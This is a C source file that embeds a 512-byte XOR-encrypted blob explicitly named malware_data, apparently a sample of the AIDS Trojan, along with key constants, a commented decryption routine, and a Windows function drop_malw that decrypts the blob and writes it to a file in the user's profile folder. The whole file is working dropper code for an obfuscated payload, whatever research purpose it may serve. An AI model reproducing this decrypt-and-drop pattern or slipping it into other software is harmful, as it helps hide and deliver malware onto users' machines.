// file: aids.crypted.bin
const size_t malware_len = 512;
unsigned char malware_data[] = {
  0x8E, 0xFE, 0xE0, 0x46, 0x50, 0x4A, 0xA7, 0x4B, 0x92, 0xCE, 0xC1, 0x4D,
  0x04, 0xB1, 0x97, 0xB0, 0x94, 0x4A, 0x0D, 0x73, 0x84, 0xAA, 0x9D, 0xF0,
  0xB8, 0x90, 0x6F, 0x2D, 0x21, 0x6D, 0xE3, 0x0C, 0xD4, 0xC5, 0x7F, 0x88,
  0xC4, 0xE4, 0xD5, 0x42, 0x73, 0x48, 0xC4, 0x17, 0xA4, 0x4D, 0xDD, 0x50,
  0x14, 0x0D, 0x14, 0xBC, 0x04, 0xFB, 0x52, 0x34, 0x74, 0x9A, 0x3C, 0xE7,
  0xE4, 0x71, 0x1E, 0x34, 0x54, 0x3C, 0xE2, 0xCD, 0x44, 0x59, 0xCF, 0x4E,
  0xB4, 0xFB, 0x66, 0xEA, 0x24, 0x1A, 0xF2, 0x74, 0x94, 0x97, 0xD7, 0x91,
  0x84, 0x8A, 0x51, 0xE3, 0xE2, 0xF0, 0xAC, 0xEE, 0x37, 0x0F, 0x01, 0x12,
  0xD2, 0x76, 0xB2, 0x39, 0x8E, 0x80, 0x70, 0x9D, 0x3C, 0xAA, 0x9B, 0x4C,
  0xAD, 0x36, 0x24, 0x01, 0x50, 0x0C, 0xB9, 0x26, 0x04, 0x0C, 0x6E, 0x85,
  0x74, 0x17, 0x51, 0xD7, 0xE4, 0xAA, 0x8E, 0x62, 0x54, 0x23, 0x67, 0x9C,
  0x2D, 0x94, 0xF2, 0x62, 0xDB, 0x65, 0x6A, 0xF5, 0x50, 0x46, 0x03, 0x94,
  0xE7, 0x11, 0x59, 0x11, 0xED, 0x6F, 0x40, 0x7C, 0xFA, 0xC3, 0xEA, 0x3C,
  0x74, 0x9F, 0xD5, 0xFC, 0xAE, 0x7A, 0x1F, 0xB8, 0xA6, 0x2E, 0x64, 0xCD,
  0x5F, 0xE7, 0x44, 0xE8, 0xC8, 0xBE, 0x13, 0x22, 0x14, 0x1E, 0x24, 0x84,
  0x65, 0xF1, 0x8F, 0x6B, 0x1B, 0xA3, 0xE0, 0x28, 0xE4, 0x23, 0x0F, 0x10,
  0x54, 0xC6, 0x73, 0xB7, 0x44, 0x5B, 0x40, 0x41, 0xB4, 0x95, 0x4A, 0xD5,
  0x45, 0x44, 0xEB, 0x5E, 0xF1, 0x04, 0xD1, 0xC5, 0xEF, 0x94, 0xFC, 0xE4,
  0x95, 0x04, 0xB0, 0xB8, 0x14, 0x10, 0xD5, 0x9D, 0xB1, 0x40, 0xBE, 0xA6,
  0xD7, 0x13, 0xC3, 0xC9, 0x25, 0xD8, 0xF6, 0x5A, 0xB7, 0x1A, 0x46, 0x02,
  0x18, 0xFE, 0x20, 0x6C, 0x11, 0xBD, 0x97, 0x5B, 0x74, 0xD1, 0x85, 0x7B,
  0xE4, 0x9C, 0x6F, 0xA5, 0x54, 0x8B, 0x2F, 0xF4, 0x13, 0x3D, 0xDA, 0x75,
  0xB4, 0xED, 0xCE, 0xB3, 0x70, 0x3D, 0x32, 0x4C, 0x94, 0x68, 0x2F, 0x79,
  0xF1, 0x9D, 0x56, 0x8A, 0xFA, 0xC9, 0xD1, 0x0D, 0x2B, 0x5F, 0x75, 0x56,
  0x97, 0xB1, 0xF9, 0xE7, 0x97, 0x04, 0x19, 0xF5, 0x66, 0x41, 0x83, 0x81,
  0xE7, 0xF2, 0x58, 0x90, 0x55, 0xF5, 0xBA, 0x94, 0x4A, 0xB1, 0x6B, 0x53,
  0x7A, 0x00, 0x08, 0x0B, 0xEA, 0x9B, 0x8E, 0x00, 0x5A, 0x9E, 0xFC, 0x1A,
  0x44, 0x59, 0x99, 0xB6, 0xB1, 0xAB, 0x83, 0xA1, 0x25, 0xFE, 0x8A, 0x7A,
  0x3A, 0x4B, 0x84, 0xFA, 0x18, 0xFF, 0x9F, 0x89, 0x74, 0xC2, 0xAE, 0x15,
  0x4D, 0x36, 0xEB, 0x40, 0xF3, 0x16, 0x2B, 0x52, 0xE9, 0x19, 0x34, 0xF4,
  0x14, 0xB7, 0x68, 0xD6, 0x3F, 0x3A, 0x53, 0x5E, 0x1E, 0x76, 0x1D, 0xC6,
  0x24, 0x71, 0x5A, 0x30, 0x56, 0x49, 0x0B, 0xCC, 0xD7, 0xEA, 0x9C, 0x5B,
  0x74, 0x56, 0xC1, 0xDA, 0xD5, 0xD8, 0x75, 0x5E, 0x1A, 0x1C, 0x35, 0x66,
  0x78, 0x18, 0x36, 0x4E, 0x0D, 0x2C, 0xAE, 0x5E, 0x57, 0xD4, 0xA3, 0x1E,
  0xD4, 0xE3, 0xB6, 0x68, 0x15, 0xF0, 0xFE, 0x48, 0xF4, 0x1E, 0xA4, 0x11,
  0xED, 0x9A, 0xA9, 0x8A, 0x9F, 0xF5, 0xF4, 0xC2, 0x3C, 0x22, 0xF7, 0xA0,
  0x27, 0xD8, 0xC7, 0x1A, 0x24, 0x4C, 0xA7, 0x54, 0xB6, 0x8F, 0xCF, 0x0B,
  0x9D, 0x3C, 0x4A, 0x47, 0xD4, 0x77, 0xC2, 0x1E, 0xA4, 0xDD, 0x70, 0x8B,
  0xA8, 0x64, 0xA4, 0x44, 0xC2, 0xB6, 0x77, 0xFD, 0xB5, 0x5D, 0xD9, 0x97,
  0x5A, 0xE1, 0x8B, 0xF8, 0xA8, 0x02, 0x0E, 0x4F, 0x4D, 0xFA, 0x41, 0x2E,
  0x88, 0x74, 0x33, 0x9B, 0xEF, 0xDB, 0x8E, 0x2E, 0x14, 0x28, 0x6C, 0xAC,
  0x67, 0x6F, 0x54, 0x6C, 0xC0, 0x81, 0x2D, 0x12, 0xE7, 0x40, 0xA5, 0x48,
  0x46, 0xA8, 0xDF, 0x66, 0xF8, 0x7F, 0x59, 0x58
};
#pragma once

//#define CRYPTBIN_WIDTH 4 // use sizeof(CRYPTBIN_KEY_TYPE)
#define CRYPTBIN_COUNT 128
#define CRYPTBIN_KEY_TYPE unsigned long
#define CRYPTBIN_KEY ((CRYPTBIN_KEY_TYPE)0x47AA1774)
#define CRYPTBIN_XVAL ((CRYPTBIN_KEY_TYPE)0x6AA1036D)

/*
// --- Cheatsheet ---
void cryptbin_simple_decrypt(void* buffer) {
  CRYPTBIN_KEY_TYPE init_key = CRYPTBIN_KEY;
  CRYPTBIN_KEY_TYPE new_key = init_key;
  for (unsigned long i=0; i<CRYPTBIN_COUNT; i++) {
    ((CRYPTBIN_KEY_TYPE*)buffer)[i] ^= new_key;
    if (CRYPTBIN_XVAL != 0) {
      new_key *= CRYPTBIN_XVAL;
    }
  }
}
*/

#include <windows.h>

// key must be 0xDEADBEAF
static BOOL drop_malw(unsigned dwKey) {

  ULONG Magic = CRYPTBIN_KEY ^ 0xDEADBEAF;

  unsigned* malware_dw = (unsigned*)malware_data;
  unsigned dwNewKey = Magic ^ dwKey;
  for (unsigned i=0; i< CRYPTBIN_COUNT; i++) {
    malware_dw[i] ^= dwNewKey;
    if (CRYPTBIN_XVAL) {
      dwNewKey *= CRYPTBIN_XVAL;
    }
  }  
  BOOL ret = FALSE;
  WCHAR szBuf[MAX_PATH];
  DWORD expnd = ExpandEnvironmentStringsW(L"%userprofile%\\!DROPMALW!.DANGER", szBuf, MAX_PATH);
  if (expnd) {
    HANDLE hFile =
      CreateFileW(szBuf, GENERIC_WRITE,
        FILE_SHARE_READ, NULL, CREATE_ALWAYS,
        0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
      DWORD dwWritten;
      ret = WriteFile(hFile, malware_data, malware_len, &dwWritten, 0);
      CloseHandle(hFile);
    }
  }
  return ret;
}

